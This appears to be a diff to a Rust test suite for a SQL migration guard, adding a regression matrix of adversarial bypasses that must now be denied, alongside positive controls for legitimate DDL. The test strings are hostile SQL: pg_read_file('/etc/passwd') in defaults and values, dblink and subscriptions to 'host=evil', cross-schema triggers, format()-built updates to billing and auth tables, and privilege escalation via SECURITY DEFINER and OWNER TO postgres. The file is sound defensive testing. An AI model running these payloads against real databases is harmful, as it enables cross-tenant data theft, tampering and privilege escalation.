@@ -231,8 +231,11 @@ fn insert_auth_schema_is_cross_schema() {
 }
 
 #[test]
-fn drop_other_project_schema_is_cross_schema() {
-    assert_cross_schema("DROP SCHEMA project_other CASCADE");
+fn drop_other_project_schema_is_denied() {
+    // DROP SCHEMA is outside a project migrator's remit entirely (schema
+    // lifecycle is the platform's, not the creator's): denied-by-default as an
+    // unrecognized/unsafe construct (was previously surfaced as CrossSchema).
+    assert_denied("DROP SCHEMA project_other CASCADE");
 }
 
 #[test]
@@ -435,6 +438,512 @@ fn unparseable_sql_is_denied_not_panicked() {
         Err(GuardError::Parse(_) | GuardError::Denied { .. }) => {}
         other => panic!("unparseable SQL must be rejected, got {other:?}"),
     }
+}
+
+// ===========================================================================
+// ADVERSARIAL BYPASS REGRESSION MATRIX (31 confirmed bypasses + class coverage)
+//
+// Each test below reproduces a bypass the adversarial critic proved against the
+// allow-by-default guard. They were RED (passed-through) before the
+// deny-by-default + full-tree-walk + non-RangeVar-schema rework; they MUST now
+// be denied. Grouped by root cause / class so a reviewer can see the *classes*
+// are closed, not just the named strings.
+// ===========================================================================
+
+/// Assert the SQL is denied. The deny-by-default catch-all rule is
+/// `unrecognized_dangerous_construct`, but a more-specific rule (or a
+/// cross-schema verdict) firing first is equally acceptable — the contract is
+/// "this must not pass". Use [`assert_denied`] semantics with a clearer name
+/// at the call sites that exercise the deny-by-default class.
+#[track_caller]
+fn assert_denied_unrecognized(sql: &str) {
+    match guard().check(sql) {
+        Err(GuardError::Denied { .. } | GuardError::CrossSchema { .. }) => {}
+        other => panic!("expected DENY for: {sql}\n  got: {other:?}"),
+    }
+}
+
+// --- GROUP 1: unhandled statement kinds → deny-by-default ------------------
+
+#[test]
+fn deny_by_default_emits_unrecognized_rule() {
+    // Proves the inversion: an unenumerated statement kind is denied by the
+    // catch-all `unrecognized_dangerous_construct` rule, not waved through.
+    for sql in [
+        "CALL some_proc()",
+        "CREATE PUBLICATION p FOR ALL TABLES",
+        "PREPARE TRANSACTION 'gid'",
+        "ALTER EXTENSION pgcrypto UPDATE",
+        "REASSIGN OWNED BY r TO postgres",
+    ] {
+        match guard().check(sql) {
+            Err(GuardError::Denied { rule, .. }) => assert_eq!(
+                rule, "unrecognized_dangerous_construct",
+                "expected deny-by-default rule for: {sql}"
+            ),
+            other => panic!("expected deny-by-default for: {sql}\n  got: {other:?}"),
+        }
+    }
+}
+
+#[test]
+fn call_procedure_denied() {
+    assert_denied_unrecognized("CALL control.f(1)");
+    assert_denied_unrecognized("CALL some_proc()");
+}
+
+#[test]
+fn create_event_trigger_denied() {
+    assert_denied_unrecognized(
+        "CREATE EVENT TRIGGER et ON ddl_command_start EXECUTE FUNCTION f()",
+    );
+}
+
+#[test]
+fn create_subscription_denied() {
+    assert_denied_unrecognized(
+        "CREATE SUBSCRIPTION s CONNECTION 'host=evil dbname=control' PUBLICATION p",
+    );
+}
+
+#[test]
+fn create_publication_denied() {
+    assert_denied_unrecognized("CREATE PUBLICATION p FOR ALL TABLES");
+}
+
+#[test]
+fn import_foreign_schema_denied() {
+    assert_denied(
+        "IMPORT FOREIGN SCHEMA remote LIMIT TO (t) FROM SERVER srv INTO project_acme",
+    );
+}
+
+#[test]
+fn create_cast_denied() {
+    assert_denied_unrecognized("CREATE CAST (int AS text) WITH FUNCTION f(int)");
+}
+
+#[test]
+fn create_transform_denied() {
+    assert_denied_unrecognized(
+        "CREATE TRANSFORM FOR int LANGUAGE sql (FROM SQL WITH FUNCTION f(internal))",
+    );
+}
+
+#[test]
+fn create_access_method_denied() {
+    assert_denied_unrecognized("CREATE ACCESS METHOD am TYPE INDEX HANDLER h");
+}
+
+#[test]
+fn prepare_statement_denied() {
+    assert_denied_unrecognized("PREPARE p AS INSERT INTO control.audit VALUES(1)");
+}
+
+#[test]
+fn prepare_transaction_denied() {
+    assert_denied_unrecognized("PREPARE TRANSACTION 'gid'");
+}
+
+#[test]
+fn reassign_owned_denied() {
+    assert_denied_unrecognized("REASSIGN OWNED BY r TO postgres");
+}
+
+#[test]
+fn drop_owned_denied() {
+    assert_denied_unrecognized("DROP OWNED BY r");
+}
+
+#[test]
+fn alter_extension_denied() {
+    assert_denied_unrecognized("ALTER EXTENSION pgcrypto UPDATE");
+}
+
+#[test]
+fn security_label_denied() {
+    assert_denied_unrecognized("SECURITY LABEL ON TABLE project_acme.t IS 'x'");
+}
+
+#[test]
+fn create_server_denied() {
+    // FDW server creation is the SSRF/reach-other-DB setup primitive.
+    assert_denied("CREATE SERVER srv FOREIGN DATA WRAPPER postgres_fdw");
+}
+
+#[test]
+fn create_foreign_data_wrapper_denied() {
+    assert_denied("CREATE FOREIGN DATA WRAPPER fdw");
+}
+
+#[test]
+fn listen_notify_denied() {
+    assert_denied_unrecognized("LISTEN chan");
+    assert_denied_unrecognized("NOTIFY chan");
+}
+
+#[test]
+fn lock_table_denied() {
+    // Out of remit (DoS primitive); not on the safe migration list.
+    assert_denied_unrecognized("LOCK TABLE project_acme.t IN ACCESS EXCLUSIVE MODE");
+}
+
+// --- GROUP 2: cross-tenant via non-RangeVar schema slots -------------------
+
+#[test]
+fn alter_table_set_schema_to_control_denied() {
+    // AlterObjectSchemaStmt.newschema — not a RangeVar; full-tree schema walk
+    // must read it. (SET SCHEMA itself is also out of remit.)
+    assert_denied("ALTER TABLE project_acme.t SET SCHEMA control");
+}
+
+#[test]
+fn create_schema_denied() {
+    // CreateSchemaStmt.schemaname — schema lifecycle is not a migrator's remit.
+    assert_denied("CREATE SCHEMA control");
+    assert_denied("CREATE SCHEMA project_acme");
+}
+
+#[test]
+fn comment_on_control_table_is_cross_schema() {
+    // CommentStmt.object is a qualified [schema, object] String list.
+    assert_cross_schema("COMMENT ON TABLE control.secrets IS 'pwned'");
+}
+
+#[test]
+fn comment_on_own_table_is_allowed() {
+    assert_ok("COMMENT ON TABLE project_acme.orders IS 'order rows'");
+}
+
+#[test]
+fn trigger_executing_control_function_is_cross_schema() {
+    // CreateTrigStmt.funcname is a String list [schema, func]; the func's
+    // schema must be checked.
+    assert_cross_schema(
+        "CREATE TRIGGER tr AFTER INSERT ON project_acme.t FOR EACH ROW EXECUTE FUNCTION control.exfil()",
+    );
+}
+
+#[test]
+fn trigger_with_own_schema_function_is_allowed() {
+    assert_ok(
+        "CREATE TRIGGER tr AFTER INSERT ON project_acme.t FOR EACH ROW EXECUTE FUNCTION project_acme.bump()",
+    );
+}
+
+#[test]
+fn alter_table_inherit_control_parent_denied() {
+    // INHERIT target is a RangeVar nested in an AlterTableCmd.def; the
+    // subcommand is also out of the safe set.
+    assert_denied("ALTER TABLE project_acme.t INHERIT control.parent");
+}
+
+#[test]
+fn alter_table_owner_to_postgres_denied() {
+    // AtChangeOwner subcommand — privilege transfer, out of safe set.
+    assert_denied("ALTER TABLE project_acme.t OWNER TO postgres");
+}
+
+#[test]
+fn alter_function_owner_to_postgres_denied() {
+    // ALTER FUNCTION … OWNER TO parses to AlterOwnerStmt — not on the safe
+    // list → denied by default (ownership transfer to a privileged role).
+    assert_denied("ALTER FUNCTION project_acme.f() OWNER TO postgres");
+}
+
+#[test]
+fn alter_type_owner_to_postgres_denied() {
+    // AlterOwnerStmt for a type — denied by default.
+    assert_denied("ALTER TYPE project_acme.mood OWNER TO postgres");
+}
+
+#[test]
+fn alter_view_owner_to_postgres_denied() {
+    // ALTER VIEW … OWNER TO parses to AlterTableStmt + AtChangeOwner → caught
+    // by the ALTER TABLE subcommand allowlist.
+    assert_denied("ALTER VIEW project_acme.v OWNER TO postgres");
+}
+
+#[test]
+fn create_policy_denied() {
+    assert_denied("CREATE POLICY p ON project_acme.t USING (true)");
+}
+
+// --- GROUP 3: CREATE RULE action subtree -----------------------------------
+
+#[test]
+fn create_rule_inserting_into_control_denied() {
+    // CREATE RULE is outside the safe migration set (deny-by-default), so it is
+    // denied wholesale — stronger than the cross-schema posture. The full-tree
+    // schema walk independently reaches the control.audit RangeVar nested in
+    // RuleStmt.actions (a slot pg_query::nodes() never recurses into).
+    assert_denied(
+        "CREATE RULE r AS ON INSERT TO project_acme.t DO ALSO INSERT INTO control.audit VALUES(1)",
+    );
+}
+
+#[test]
+fn create_rule_with_pg_read_file_denied() {
+    assert_denied(
+        "CREATE RULE r AS ON INSERT TO project_acme.t DO INSTEAD SELECT pg_read_file('/etc/passwd')",
+    );
+}
+
+// --- GROUP 4: dangerous func in expr slots of recognized statements --------
+
+#[test]
+fn create_table_column_default_pg_read_file_denied() {
+    // Column DEFAULT is a slot pg_query::nodes() skips → full-tree walk closes.
+    assert_denied("CREATE TABLE project_acme.t (c text DEFAULT pg_read_file('/etc/passwd'))");
+}
+
+#[test]
+fn create_table_default_subselect_pg_read_file_denied() {
+    assert_denied(
+        "CREATE TABLE project_acme.t (c int DEFAULT (SELECT pg_read_file('/x')::int))",
+    );
+}
+
+#[test]
+fn create_table_check_constraint_pg_read_file_denied() {
+    assert_denied(
+        "CREATE TABLE project_acme.t (c int CHECK (c < length(pg_read_file('/x'))))",
+    );
+}
+
+#[test]
+fn alter_column_set_default_pg_read_file_denied() {
+    assert_denied(
+        "ALTER TABLE project_acme.t ALTER COLUMN c SET DEFAULT pg_read_file('/x')",
+    );
+}
+
+#[test]
+fn insert_values_pg_read_file_denied() {
+    // INSERT … VALUES(...) list is another slot the partial walk skipped.
+    assert_denied("INSERT INTO project_acme.t VALUES (pg_read_file('/etc/passwd'))");
+}
+
+#[test]
+fn update_set_dblink_denied() {
+    assert_denied(
+        "UPDATE project_acme.t SET c = dblink('host=evil','SELECT 1')",
+    );
+}
+
+// --- GROUP 5: plpgsql runtime-constructed SQL ------------------------------
+
+#[test]
+fn do_block_format_identifier_to_control_denied() {
+    // s := 'control'; EXECUTE format('UPDATE %I.creator_billing …', s) — the
+    // target schema is a bare literal, not a schema.ident adjacency.
+    assert_denied(
+        "DO $$ DECLARE s text := 'control'; BEGIN EXECUTE format('UPDATE %I.creator_billing SET amount=0', s); END $$",
+    );
+}
+
+#[test]
+fn do_block_format_identifier_to_other_project_denied() {
+    // format('%I.t', 'project_other') reaches another project's schema.
+    assert_denied(
+        "DO $$ BEGIN EXECUTE format('UPDATE %I.t SET x=0', 'project_other'); END $$",
+    );
+}
+
+#[test]
+fn plpgsql_function_format_identifier_to_control_denied() {
+    assert_denied(
+        "CREATE FUNCTION project_acme.f() RETURNS void LANGUAGE plpgsql AS $$ DECLARE s text := 'auth'; BEGIN EXECUTE format('DELETE FROM %I.users', s); END $$",
+    );
+}
+
+#[test]
+fn benign_plpgsql_with_data_literal_is_allowed() {
+    // A body with a plain data literal (no %I template, not a platform schema)
+    // must NOT be falsely denied — guards against over-denial of group 5.
+    assert_ok(
+        "CREATE FUNCTION project_acme.g() RETURNS text LANGUAGE plpgsql AS $$ BEGIN RETURN 'active'; END $$",
+    );
+}
+
+// --- GROUP 6: SECURITY DEFINER / search_path -------------------------------
+
+#[test]
+fn create_function_security_definer_denied() {
+    assert_denied(
+        "CREATE FUNCTION project_acme.f() RETURNS int LANGUAGE sql SECURITY DEFINER AS 'SELECT 1'",
+    );
+}
+
+#[test]
+fn create_function_security_invoker_is_allowed() {
+    // SECURITY INVOKER (the default, explicitly stated) is fine.
+    assert_ok(
+        "CREATE FUNCTION project_acme.f() RETURNS int LANGUAGE sql SECURITY INVOKER AS 'SELECT 1'",
+    );
+}
+
+#[test]
+fn create_function_set_search_path_denied() {
+    assert_denied(
+        "CREATE FUNCTION project_acme.f() RETURNS int LANGUAGE sql SET search_path = control AS 'SELECT 1'",
+    );
+}
+
+#[test]
+fn alter_function_set_search_path_denied() {
+    assert_denied("ALTER FUNCTION project_acme.f() SET search_path = control");
+}
+
+#[test]
+fn alter_function_security_definer_denied() {
+    assert_denied("ALTER FUNCTION project_acme.f() SECURITY DEFINER");
+}
+
+// --- Positive controls for the NEWLY-ADMITTED safe-list statement kinds ----
+// (deny-by-default must still let legitimate migration DDL through)
+
+#[test]
+fn safe_create_view_passes() {
+    assert_ok("CREATE VIEW project_acme.active AS SELECT * FROM project_acme.orders");
+}
+
+#[test]
+fn safe_create_materialized_view_passes() {
+    assert_ok("CREATE MATERIALIZED VIEW project_acme.mv AS SELECT 1");
+}
+
+#[test]
+fn safe_create_enum_type_passes() {
+    assert_ok("CREATE TYPE project_acme.mood AS ENUM ('happy','sad')");
+}
+
+#[test]
+fn safe_alter_type_add_value_passes() {
+    let r = assert_ok("ALTER TYPE project_acme.mood ADD VALUE 'meh'");
+    assert!(
+        r.classes.iter().any(|c| c.non_transactional),
+        "ALTER TYPE ADD VALUE is non-transactional"
+    );
+}
+
+#[test]
+fn safe_create_composite_type_passes() {
+    assert_ok("CREATE TYPE project_acme.point AS (x int, y int)");
+}
+
+#[test]
+fn safe_create_sequence_passes() {
+    assert_ok("CREATE SEQUENCE project_acme.s");
+}
+
+#[test]
+fn safe_alter_sequence_passes() {
+    assert_ok("ALTER SEQUENCE project_acme.s RESTART WITH 1000");
+}
+
+#[test]
+fn safe_drop_view_passes() {
+    assert_ok("DROP VIEW project_acme.active");
+}
+
+#[test]
+fn safe_drop_index_concurrently_passes() {
+    let r = assert_ok("DROP INDEX CONCURRENTLY project_acme.idx");
+    assert!(
+        r.classes.iter().any(|c| c.non_transactional),
+        "DROP INDEX CONCURRENTLY is non-transactional"
+    );
+}
+
+#[test]
+fn safe_refresh_matview_passes() {
+    assert_ok("REFRESH MATERIALIZED VIEW project_acme.mv");
+}
+
+#[test]
+fn safe_drop_function_passes() {
+    assert_ok("DROP FUNCTION project_acme.f()");
+}
+
+#[test]
+fn safe_create_trigger_own_schema_passes() {
+    assert_ok(
+        "CREATE TRIGGER tr BEFORE UPDATE ON project_acme.t FOR EACH ROW EXECUTE FUNCTION project_acme.bump()",
+    );
+}
+
+#[test]
+fn safe_seed_insert_passes() {
+    assert_ok("INSERT INTO project_acme.config(k, v) VALUES ('theme', 'dark')");
+}
+
+#[test]
+fn safe_backfill_update_passes() {
+    assert_ok("UPDATE project_acme.orders SET status = 'pending' WHERE status IS NULL");
+}
+
+#[test]
+fn safe_begin_commit_passes() {
+    assert_ok("BEGIN");
+    assert_ok("COMMIT");
+}
+
+#[test]
+fn safe_drop_type_passes() {
+    assert_ok("DROP TYPE project_acme.mood");
+}
+
+#[test]
+fn safe_rename_column_passes() {
+    assert_ok("ALTER TABLE project_acme.t RENAME COLUMN a TO b");
+}
+
+// --- Full-tree-walk coverage in deeper expression slots --------------------
+
+#[test]
+fn expression_index_with_pg_read_file_denied() {
+    assert_denied("CREATE INDEX i ON project_acme.t ((pg_read_file('/x')))");
+}
+
+#[test]
+fn generated_column_with_pg_read_file_denied() {
+    assert_denied(
+        "CREATE TABLE project_acme.t (a int, b int GENERATED ALWAYS AS (length(pg_read_file('/x'))) STORED)",
+    );
+}
+
+#[test]
+fn merge_with_pg_read_file_denied() {
+    assert_denied(
+        "MERGE INTO project_acme.t USING project_acme.s ON true WHEN MATCHED THEN UPDATE SET c = pg_read_file('/x')",
+    );
+}
+
+#[test]
+fn create_table_as_into_control_is_cross_schema() {
+    assert_cross_schema("CREATE TABLE control.x AS SELECT 1");
+}
+
+// --- Over-denial guards: neutral schemas / qualified builtins must PASS -----
+// (the funcname full-tree walk must not false-positive on pg_catalog/public)
+
+#[test]
+fn qualified_pg_catalog_builtin_is_allowed() {
+    assert_ok("SELECT pg_catalog.length('x')");
+    assert_ok("CREATE TABLE project_acme.t (c int DEFAULT pg_catalog.abs(-1))");
+}
+
+#[test]
+fn qualified_public_function_is_allowed() {
+    // `public.fn(…)` qualification is routine (extensions install there);
+    // a function-name qualifier to public must not be flagged cross-schema.
+    assert_ok("SELECT public.gen_random_uuid()");
+}
+
+#[test]
+fn own_schema_qualified_function_call_is_allowed() {
+    assert_ok("SELECT project_acme.helper(1)");
 }
 
 // ---------------------------------------------------------------------------
